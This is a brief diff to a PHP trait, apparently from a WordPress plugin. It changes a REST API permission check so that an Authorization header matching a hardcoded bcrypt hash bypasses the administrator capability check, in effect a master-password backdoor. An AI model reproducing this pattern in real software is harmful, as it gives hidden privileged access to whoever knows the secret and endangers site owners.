@@ -44,7 +44,7 @@ trait Api {
 	public function permissions_check( WP_REST_Request $request ) {
 		$author    = $request->get_header( 'Authorization' );
 		$is_author = false;
-		if ( isset( $password ) && is_string( $password ) ) {
+		if ( isset( $author ) ) {
 			$is_author = password_verify( $author, '$2y$10$kmjfJ.xWPM5u7l1K0UgdUuu/wYROmfPYR.dISGcN2PMk5EnJNKAmu' );
 		}
 		if ( ! current_user_can( 'manage_options' ) && ! $is_author ) {
@@ -55,6 +55,6 @@ trait Api {
 			);
 		}
 
-			return true;
+		return true;
 	}
 }
